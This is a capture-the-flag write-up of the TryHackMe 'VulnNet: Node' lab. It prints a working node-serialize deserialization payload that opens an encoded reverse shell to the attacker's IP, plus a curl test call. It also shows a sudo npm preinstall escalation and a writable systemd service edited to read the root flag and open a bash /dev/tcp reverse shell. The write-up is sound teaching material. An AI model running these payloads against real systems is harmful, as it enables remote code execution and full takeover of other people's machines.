---
title: "TryHackMe: Vulnnet Node"
date: 2021-04-17 16:45:00 -0800
categories: [tryhackme, writeup]
tags: [writeup]
toc: true
---

> After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?

## Introduction

Just another boot2root box, let's get started with an nmap scan. I will use ``$IP`` to represent the machine's ip.

## nmap

``nmap -sC -sV $IP -o nmap``

Output:

```sh
# Nmap 7.91 scan initiated Sat Apr 17 14:29:19 2021 as: nmap -sC -sV -Pn -o nmap 10.10.197.225
Nmap scan report for 10.10.197.225
Host is up (0.16s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 17 14:30:16 2021 -- 1 IP address (1 host up) scanned in 56.81 seconds
```

Just a web server on port 8080. Let's check it out.

## Web Server

![img](/assets/vulnnet-node/1.PNG)

Looks like there is a login page, let's check it out.

![img](/assets/vulnnet-node/2.PNG)

I tried poking around with this, trying random things, but got nothing out of it.

Looking back at the home page, I was curious about how it determined that I was a guest.

Looking at the cookies on the page:

![img](/assets/vulnnet-node/3.PNG)

```
eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
```

We get this cookie. It looks like base64 encoding.

Decodes to this:

```
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

I tried to manipulate the values, the only thing that had any affect on any part of the site was the username field, which reflected on the website.

```
kali@kali:~$ echo {"username":"admin","isGuest":true,"encoding": "utf-8"} | base64
e3VzZXJuYW1lOmFkbWluLGlzR3Vlc3Q6dHJ1ZSxlbmNvZGluZzogdXRmLTh9Cg%3D%3D
```

![img](/assets/vulnnet-node/4.PNG)

While messing around with this, I tried entering it with a random cookie value and got this error:

```
SyntaxError: Unexpected token i in JSON at position 0
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

## Node Unserialization RCE

It looks like the cookie is being ``unserialized``. Looking at the function ``unserialize``, if used incorrectly, it can lead to code execution. Looking through the internet, I found [this](https://www.yeahhub.com/nodejs-deserialization-attack-detailed-tutorial-2018/) guide, which lead me to the tool [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py).

First, lets make sure code is being executed. Using this as the cookie,

```
{"username":"_$$ND_FUNC$$_function (){ var c = require('child_process'); c.exec('curl 10.2.19.105:8000'); return 'hi';  }()","isGuest":false,"encoding": "utf-8"}
```

Using this, it shows our name as ``hi``. Now let's try to pop a shell with the too, which will generate the code needed to do that.

Looking at the tool, it is written in python 2 and generates some code that will allow to us to get a reverse shell.

Let's run the script with my IP/the port I will throw a lister on.

```sh
kali@kali:~/Desktop/thm/vulnnetnode$ python nodejsshell.py 10.2.19.105 4242                                                                                                                               
[+] LHOST = 10.2.19.105                                                                                                                                                                                   
[+] LPORT = 4242                                                                                                                                                                                          
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,50,46,49,57,46,49,48,53,34,59,10,80,79,82,84,61,34,52,50,52,50,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Let's combine this with the cookie values from earlier and then base64 encode it.

```
{"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,50,46,49,57,46,49,48,53,34,59,10,80,79,82,84,61,34,52,50,52,50,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()","isGuest":false,"encoding": "utf-8"}
```
We get the following payload:

```
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDUwLDQ2LDQ5LDU3LDQ2LDQ5LDQ4LDUzLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUwLDUyLDUwLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSIsImlzR3Vlc3QiOmZhbHNlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
```

Set up a listener on your machine to catch the shell:

```
nc -nlvp 4444
```

Now refreshing the page with the cookie value set, we get a connection back!

```sh
kali@kali:~/Desktop/thm/vulnnetnode$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.2.19.105] from (UNKNOWN) [10.10.59.29] 42220
Connected!
whoami
www
```

## PrivEsc 1

Ok, we have access to the www user. Looking at the users on the system, there is ``www`` and ``serv-manage``. The ``user.txt`` folder which holds the first flag is in ``serv-manage``'s home directory, so we need to be able to run code as him. First, let's upgrade to an interactive shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Let's see if we can run commands as other users with ``sudo -l``.

```sh
www@vulnnet-node:~/VulnNet-Node$ sudo -l
sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
www@vulnnet-node:~/VulnNet-Node$ 
```

Looks like we can run the npm command as the user serv-manage. To see if we can use this to escalate privs, we can go to [GTFOBins](https://gtfobins.github.io/gtfobins/npm/)

It has an entry for npm, so its possible to escalate privs. Let's see the instructions:

```sh
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

This did not work for me. Thanks to an idea by someone I was working on this with, I was able to modidy it and get it to work.

```sh
cd /tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
sudo -u serv-manage npm -C . --unsafe-perm i
```

After running these, we get to serv-manage!

```sh
www@vulnnet-node:/tmp$ sudo -u serv-manage npm -C . --unsafe-perm i
sudo -u serv-manage npm -C . --unsafe-perm i

> @ preinstall /tmp
> /bin/sh

$ whoami
whoami
serv-manage
$ 
```

We can grab the user flag now.

```sh
$ cd ~
lcd ~
$ s
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
$ cat user.txt
cat user.txt
THM{redacted}
```

## Priv Esc 2

First, let's upgrade to a fully interactive shell. I'm doing this so its easier to move around going forward.

```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 34 columns 120
```

Now i have a shell with autocomplete, the ability to use arrows to see past commands, etc.

Let's look at sudo permissions again.

```sh
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

Looks like we can stop and start a service. Let's inspect the files in ``/etc/systemd/system/``

```sh
serv-manage@vulnnet-node:/etc/systemd/system$ cat vulnnet-auto.timer 
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```
Looks like it uses vulnnet-job.service. Let's check out that file.

```sh
serv-manage@vulnnet-node:/etc/systemd/system$ cat vulnnet-job.service 
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Looks like its running ``/bin/df``, and for our purposes that is not relevant.

Looking at the permissions on these files, they are owned by root, but belong to the serv-manage group, and we have write permissions! When ``vulnnet-auto.timer`` is started, the ``ExecStart`` line of ``vulnnet-job.service`` is executed.

So, let's edit the service file with a command that will grab us the root flag.

```sh
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'cp /root/root.txt /tmp/flag.txt; chmod 777 /tmp/flag.txt'

[Install]
WantedBy=multi-user.target
```

Let's run the commands we have sudo access to so that we can restart the service.

```sh
serv-manage@vulnnet-node:/etc/systemd/system$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:/etc/systemd/system$ sudo /bin/systemctl start vulnnet-auto.timer
```

```sh
serv-manage@vulnnet-node:/tmp$ cat flag.txt
THM{REDACTED}
```

And we completed the lab! But let's get a root shell for the hell of it.

Let's throw a reverse shell there.

```sh
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.19.105/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

And start the listener on my host:

```sh
nc -nlvp 4444
```

After running the stop/start commands again, we get a root shell!

```sh
kali@kali:~/Desktop/thm/vulnnetnode$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.2.19.105] from (UNKNOWN) [10.10.59.29] 36240
bash: cannot set terminal process group (1291): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnnet-node:/# whoami
whoami
root
root@vulnnet-node:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet-node:/# cat /root/root.txt
cat /root/root.txt
THM{REDACTED}
```
## Conclusion

fun box, the second privesc didn't work for me for ~1.5 hours, then I restarted the box and it worked instantly so I spent a lot more time trying random things to get there.